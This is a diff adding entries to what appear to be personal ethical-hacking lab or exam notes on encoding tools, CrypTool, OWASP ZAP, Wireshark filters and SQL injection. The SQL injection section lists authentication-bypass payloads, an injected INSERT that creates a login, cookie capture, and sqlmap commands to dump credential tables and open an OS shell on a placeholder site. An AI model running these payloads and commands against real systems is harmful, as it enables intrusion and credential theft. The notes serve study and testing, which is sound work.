@@ -142,6 +142,59 @@ Crack Hashes
 	convert md5 to plaintext.
 	if hashtype not mentioned above site will identify automatically.
 
+
+BCTextEncoder
+	open exe
+	enter text in input box an click encode... enter pass.. this will generate encoded text.
+
+	now enter (All) encoded text to encoded and click decode and enter pass
+
+
+Cryp Tool
+	open exe
+	open new file- enter text- go to Encrypt/Decrypt - select symmetric modern - select algo type - enter key length and encrypt - save it
+
+	open cryp tool - open file  - goto encrypt/decrypt - select algo type - enter length as mentioned and decrypt
+
+
+	now with ECB type demo
+	
+
+========================================================================
+SQL Injection
+	try
+	username'--
+	sam 'OR 1=1 --
+	1- Auth Bypass-  hi'OR 1=1 --
+2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
+3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
+Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
+sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
+4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
+5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
+6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
+6.1 In the shell type-   TASKLIST  (to view the tasks)
+6.2 Use systeminfo for windows to get all os version
+6.3 Use uname -a for linux to get os version
+
+=====================================================================
+OWASP ZAP
+	Automated scan
+	enter url/domain
+	click Attack
+
+	check Active Scan below
+	or check Alerts- SQL Injection-> drill down
+======================================================================
+Wireshark
+
+	tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given. Check whose count is higher. also check destination and source ip address to verify.
+	
+	tcp.flags.syn == 1   (Which machine for dos)
+
+	convert in readable
+	http.request.method == POST   (for passwords) or click tools ---> credentials
+
 ========================================================================
 Wi-FI
 	start monitoring
